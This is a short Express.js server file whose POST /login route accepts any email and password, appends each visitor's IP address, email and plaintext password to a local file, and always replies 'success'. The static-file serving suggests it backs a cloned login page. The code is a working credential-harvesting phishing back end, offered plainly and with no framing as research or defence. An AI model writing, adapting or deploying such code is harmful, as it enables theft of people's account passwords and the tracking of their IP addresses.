const express = require("express");
const path = require("path");
const fs = require("fs");
const app = express();

// Allow form POST data
app.use(express.urlencoded({ extended: true }));

// Serve all static files (HTML, CSS, JS, images)
app.use(express.static(path.join(__dirname)));

// ⭐ ALWAYS SUCCESSFUL LOGIN + STORE IP ⭐
app.post("/login", (req, res) => {
    const userIP =
        req.headers["x-forwarded-for"] || // Render / proxies
        req.socket.remoteAddress ||       // Direct connection
        "Unknown IP";

    const email = req.body.email;
    const password = req.body.password;

    const logEntry = `IP: ${userIP} | Email: ${email} | Password: ${password}\n`;

    // Save IP + email + password to a file
    fs.appendFileSync("ips.txt", logEntry);

    // Always return success
    res.send("success");
});

// Start server
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`Server running on port ${PORT}`);
});
